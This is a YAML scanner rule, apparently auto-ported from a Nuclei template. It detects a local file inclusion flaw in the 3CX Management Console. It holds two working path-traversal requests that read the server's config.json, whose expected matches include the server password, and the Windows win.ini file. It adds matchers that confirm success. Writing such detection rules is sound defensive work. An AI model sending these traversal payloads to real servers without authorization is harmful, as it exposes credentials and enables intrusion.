schema_version: 1
id: "cortex.community:3cx-management-console"
rule_version: "1.0.0"
requires:
  engine_api: 1
  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
info:
  name: "3CX Management Console - Local File Inclusion"
  description: "3CX Management Console is vulnerable to local file inclusion. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
  references:
    - "https://medium.com/@frycos/pwning-3cx-phone-management-backends-from-the-internet-d0096339dd88"
  cwes: [23]
  tags: ["3cx", "lfi", "voip", "vuln", "nuclei", "auto-ported", "signal"]
  remediation: "See the referenced advisory / template source for remediation."
finding:
  sink_type: "VULNERABLE_COMPONENT"
  impact: "INFORMATION_DISCLOSURE"
  severity: "High"
  root_cause: "nuclei-ported-signal"
execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
steps:
  - id: "probe0"
    request: { method: "GET", path: "/Electron/download/windows/..\\..\\..\\Http\\webroot\\config.json" }
  - id: "probe1"
    request: { method: "GET", path: "/Electron/download/windows/\\windows\\win.ini" }
proof:
  kind: "signal.v1"
  assertions:
    any:
      - any:
          - all:
              - contains: { left: { ref: "steps.probe0.body" }, right: { value: "CfgServerPassword" } }
              - contains: { left: { ref: "steps.probe0.body" }, right: { value: "CfgServerAppName" } }
          - all:
              - contains: { left: { ref: "steps.probe0.body" }, right: { value: "bit app support" } }
              - contains: { left: { ref: "steps.probe0.body" }, right: { value: "fonts" } }
              - contains: { left: { ref: "steps.probe0.body" }, right: { value: "extensions" } }
      - any:
          - all:
              - contains: { left: { ref: "steps.probe1.body" }, right: { value: "CfgServerPassword" } }
              - contains: { left: { ref: "steps.probe1.body" }, right: { value: "CfgServerAppName" } }
          - all:
              - contains: { left: { ref: "steps.probe1.body" }, right: { value: "bit app support" } }
              - contains: { left: { ref: "steps.probe1.body" }, right: { value: "fonts" } }
              - contains: { left: { ref: "steps.probe1.body" }, right: { value: "extensions" } }
